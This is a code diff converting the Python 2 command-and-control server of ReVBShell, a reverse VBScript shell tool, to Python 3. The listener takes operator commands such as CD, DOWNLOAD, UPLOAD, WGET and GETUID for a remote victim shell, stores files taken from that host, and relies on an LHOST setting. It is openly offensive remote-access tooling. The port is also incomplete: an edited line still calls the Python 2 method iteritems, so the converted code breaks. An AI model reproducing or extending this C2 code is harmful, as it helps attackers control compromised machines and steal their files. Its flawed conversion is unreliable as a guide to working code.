@@ -12,11 +12,12 @@
 #  https://github.com/bitsadmin/ReVBShell
 #
 
-from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
+
+from http.server import BaseHTTPRequestHandler, HTTPServer
 import cgi
 import os
 import sys
-from Queue import Queue
+from queue import Queue
 from threading import Thread
 from shutil import copyfile, rmtree
 import ntpath
@@ -74,7 +75,7 @@ class myHandler(BaseHTTPRequestHandler):
         # Show '> ' command input string after command output
         if context:
             cmd_data = cmd_data.replace(context + ' ', '')
-        print cmd_data
+        print(cmd_data)
 
         # Store file
         if self.path == '/upload':
@@ -83,13 +84,13 @@ class myHandler(BaseHTTPRequestHandler):
                 os.mkdir('Downloads')
 
             # Write file to disk
-            with file(os.path.join('Downloads', result_filename), 'wb') as f:
+            with open(os.path.join('Downloads', result_filename), 'wb') as f:
                 f.write(result_data)
 
-            print 'File \'%s\' downloaded.' % result_filename
+            print(f'File {result_filename} downloaded.')
         # Print output
         else:
-            print result_data
+            print(result_data)
 
         sys.stdout.write('%s> ' % context)
 
@@ -128,7 +129,7 @@ def main():
     global context, variables
     s = ''
     while True:
-        s = raw_input('%s> ' % context)
+        s = input('%s> ' % context)
         s = s.strip()
         splitcmd = s.split(' ', 1)
         cmd = splitcmd[0].upper()
@@ -162,12 +163,12 @@ def main():
 
                 # Check file existence
                 if not os.path.exists(args):
-                    print 'File not found: %s' % args
+                    print(f'File not found: {args}')
                     continue
 
                 # Check if LHOST variable is set
                 if 'LHOST' not in variables:
-                    print 'Variable LHOST not set'
+                    print('Variable LHOST not set')
                     continue
                 lhost = variables['LHOST']
 
@@ -200,12 +201,12 @@ def main():
                     (variable, value) = args.split(' ')
                     variables[variable.upper()] = value
                 else:
-                    print '\n'.join('%s: %s' % (key, value) for key,value in variables.iteritems())
+                    print('\n'.join('%s: %s' % (key, value) for key,value in variables.iteritems()))
                 continue
 
             # HELP
             elif cmd == 'HELP':
-                print 'Supported commands:\n' \
+                print('Supported commands:\n' \
                       '- CD [directory]     - Change directory. Shows current directory when without parameter.\n' \
                       '- DOWNLOAD [path]    - Download the file at [path] to the .\\Downloads folder.\n' \
                       '- GETUID             - Get shell user id.\n' \
@@ -226,7 +227,7 @@ def main():
                       '- UNSET [name]       - Unset a variable\n' \
                       '- UPLOAD [localpath] - Upload the file at [path] to the remote host.\n' \
                       '                       Note: Variable LHOST is required.\n' \
-                      '- WGET [url]         - Download file from url.\n'
+                      '- WGET [url]         - Download file from url.\n')
                 continue
 
             # SHUTDOWN
@@ -234,7 +235,7 @@ def main():
                 server.shutdown()
                 if os.path.exists('./upload'):
                     rmtree('./upload')
-                print 'Shutting down %s' % os.path.basename(__file__)
+                print(f'Shutting down {os.path.basename(__file__)}')
                 exit(0)
 
         commands.put(' '.join([cmd, args]))
